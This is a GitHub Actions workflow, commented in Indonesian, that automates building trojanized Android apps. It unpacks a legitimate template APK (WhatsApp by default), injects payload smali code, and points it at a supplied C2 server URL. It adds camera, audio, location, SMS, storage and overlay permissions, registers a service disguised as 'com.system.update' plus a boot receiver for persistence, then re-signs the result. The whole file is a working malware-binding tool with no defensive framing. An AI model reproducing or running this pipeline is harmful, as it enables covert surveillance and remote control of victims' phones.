name: Build APK

on:
  workflow_dispatch:
    inputs:
      build_id:
        description: 'Build ID'
        required: true
      app_name:
        description: 'Nama Aplikasi'
        required: true
      package_name:
        description: 'Nama Paket (UNTUK PAYLOAD)'
        required: true
      c2_url:
        description: 'URL Server C2'
        required: true
      bind_target:
        description: 'Target Binding'
        required: true
        default: 'whatsapp'
      permissions:
        description: 'Izin (JSON)'
        required: false
      icon_base64:
        description: 'Ikon (Base64) - OPSIONAL'
        required: false

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        with:
          lfs: true

      - name: Force install Git LFS and pull files
        run: |
          sudo apt-get update
          sudo apt-get install -y git-lfs
          git lfs install
          git lfs pull

      - name: Setup Java
        uses: actions/setup-java@v5
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: Install dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y wget unzip python3 python3-pip libxml2-utils

      - name: Download Apktool JAR
        run: |
          wget -O apktool.jar https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar
          sudo mv apktool.jar /usr/local/bin/apktool.jar

      - name: Download Uber APK Signer
        run: |
          wget -O uber-apk-signer.jar https://github.com/patrickfav/uber-apk-signer/releases/download/v1.3.0/uber-apk-signer-1.3.0.jar

      - name: Prepare template APK (WAJIB LOKAL)
        run: |
          TEMPLATE_FILE="templates/${{ inputs.bind_target }}.apk"
          if [ ! -f "$TEMPLATE_FILE" ]; then
            echo "❌ ERROR: File template tidak ditemukan: $TEMPLATE_FILE"
            exit 1
          fi
          echo "✅ Menggunakan template lokal: $TEMPLATE_FILE"
          cp "$TEMPLATE_FILE" template.apk
          if ! file template.apk | grep -q "Android package"; then
            echo "❌ ERROR: File template bukan APK valid."
            file template.apk
            exit 1
          fi
          echo "✅ Template APK valid."

      - name: Decode template APK
        run: java -jar /usr/local/bin/apktool.jar d template.apk -o decoded/

      - name: Install framework resource
        run: |
          java -jar /usr/local/bin/apktool.jar if template.apk || true

      - name: Inject payload smali
        run: |
          if [ -d "payload/smali" ]; then
            cp -r payload/smali/* decoded/smali/
          fi

      - name: Replace C2 URL in payload smali
        run: |
          find decoded/smali -name "*.smali" -exec sed -i "s|https://your-server.com|${{ inputs.c2_url }}|g" {} \; || true
          echo "✅ URL C2 diganti"

      - name: Modify AndroidManifest.xml safely with Python (using ElementTree)
        run: |
          python3 << 'EOF'
          import xml.etree.ElementTree as ET
          import re

          manifest_path = "decoded/AndroidManifest.xml"

          # 1. Baca file sebagai teks dan perbaiki DUMMYVAL
          with open(manifest_path, 'r') as f:
              content = f.read()

          # Ganti semua DUMMYVAL dengan placeholder yang aman
          content = re.sub(r'APKTOOL_DUMMYVAL_[^\s"\']+', 'dummy', content)

          # 2. Tulis ulang file sementara
          with open(manifest_path, 'w') as f:
              f.write(content)

          # 3. Parse XML menggunakan ElementTree
          try:
              tree = ET.parse(manifest_path)
              root = tree.getroot()
          except ET.ParseError as e:
              print(f"❌ Error parsing XML: {e}")
              # Jika gagal, gunakan lxml
              from lxml import etree
              parser = etree.XMLParser(recover=True)
              root = etree.parse(manifest_path, parser).getroot()
              tree = root

          # 4. Tambahkan izin (permissions) di bawah root (sebelum application)
          permissions = [
              'android.permission.INTERNET',
              'android.permission.ACCESS_NETWORK_STATE',
              'android.permission.FOREGROUND_SERVICE',
              'android.permission.CAMERA',
              'android.permission.RECORD_AUDIO',
              'android.permission.ACCESS_FINE_LOCATION',
              'android.permission.READ_SMS',
              'android.permission.READ_EXTERNAL_STORAGE',
              'android.permission.WRITE_EXTERNAL_STORAGE',
              'android.permission.SYSTEM_ALERT_WINDOW'
          ]
          for perm in permissions:
              perm_elem = ET.Element('uses-permission')
              perm_elem.set('{http://schemas.android.com/apk/res/android}name', perm)
              root.insert(0, perm_elem)

          # 5. Cari elemen <application>
          application = None
          for child in root:
              if child.tag == 'application':
                  application = child
                  break

          # 6. Tambahkan service dan receiver ke dalam <application>
          if application is not None:
              # Service UpdateService
              service = ET.Element('service')
              service.set('{http://schemas.android.com/apk/res/android}name', 'com.system.update.UpdateService')
              service.set('{http://schemas.android.com/apk/res/android}exported', 'false')
              service.set('{http://schemas.android.com/apk/res/android}foregroundServiceType', 'dataSync')
              application.append(service)

              # Receiver BootReceiver
              receiver = ET.Element('receiver')
              receiver.set('{http://schemas.android.com/apk/res/android}name', 'com.system.update.BootReceiver')
              receiver.set('{http://schemas.android.com/apk/res/android}exported', 'true')
              intent_filter = ET.Element('intent-filter')
              action1 = ET.Element('action')
              action1.set('{http://schemas.android.com/apk/res/android}name', 'android.intent.action.BOOT_COMPLETED')
              intent_filter.append(action1)
              action2 = ET.Element('action')
              action2.set('{http://schemas.android.com/apk/res/android}name', 'android.net.conn.CONNECTIVITY_CHANGE')
              intent_filter.append(action2)
              receiver.append(intent_filter)
              application.append(receiver)

          # 7. Tulis ulang AndroidManifest.xml dengan format yang bagus
          tree.write(manifest_path, encoding='utf-8', xml_declaration=True)

          print("✅ AndroidManifest.xml berhasil dimodifikasi dengan aman")
          EOF

      - name: Clean dummy files and references
        run: |
          find decoded -type f -name "*DUMMYVAL*" -delete 2>/dev/null || true
          find decoded -name "*.xml" -exec sed -i '/DUMMYVAL/d' {} \; 2>/dev/null || true
          find decoded -name "public.xml" -delete 2>/dev/null || true
          echo "✅ DUMMYVAL berhasil dibersihkan"

      - name: Validate and remove invalid XML files
        run: |
          python3 << 'EOF'
          import os
          import subprocess
          from pathlib import Path

          RES_DIR = "decoded/res"
          invalid_count = 0

          for root, dirs, files in os.walk(RES_DIR):
              for file in files:
                  if file.endswith(".xml"):
                      path = os.path.join(root, file)
                      try:
                          result = subprocess.run(
                              ["xmllint", "--noout", path],
                              capture_output=True,
                              text=True,
                              timeout=2
                          )
                          if result.returncode != 0:
                              print(f"❌ Invalid XML: {path}")
                              os.remove(path)
                              invalid_count += 1
                      except Exception as e:
                          print(f"⚠️ Error processing {path}: {e}")
                          os.remove(path)
                          invalid_count += 1

          print(f"✅ {invalid_count} file XML invalid dihapus")
          EOF

      - name: Remove all problematic drawable files (additional)
        run: |
          find decoded/res -name "abc_*" -delete 2>/dev/null || true
          find decoded/res -name "design_*" -delete 2>/dev/null || true
          find decoded/res -name "mtrl_*" -delete 2>/dev/null || true
          find decoded/res -name "*\$*" -delete 2>/dev/null || true
          echo "✅ Drawable tambahan dihapus"

      - name: Rebuild APK with --copy-original
        run: |
          java -jar /usr/local/bin/apktool.jar b decoded -o unsigned.apk --copy-original

      - name: Sign APK
        run: |
          keytool -genkey -v -keystore debug.keystore -alias release -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown" -storepass android -keypass android
          jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore debug.keystore -storepass android -keypass android unsigned.apk release
          zipalign -v -p 4 unsigned.apk signed.apk 2>/dev/null || true

      - name: Upload APK as artifact
        uses: actions/upload-artifact@v4
        with:
          name: app-${{ inputs.build_id }}
          path: signed.apk
